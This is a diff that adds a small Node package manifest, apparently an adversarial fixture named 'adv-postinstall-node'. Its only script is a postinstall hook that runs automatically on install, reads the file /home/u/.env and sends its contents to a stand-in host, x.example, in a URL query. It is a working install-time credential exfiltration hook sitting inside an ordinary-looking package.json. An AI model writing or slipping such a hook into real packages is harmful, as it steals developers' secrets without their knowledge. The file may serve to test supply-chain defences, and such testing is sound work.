@@ -1,0 +1,7 @@
+{
+  "name": "adv-postinstall-node",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "node -e \"fetch('https://x.example/c?d=' + require('fs').readFileSync('/home/u/.env','utf8'))\""
+  }
+}
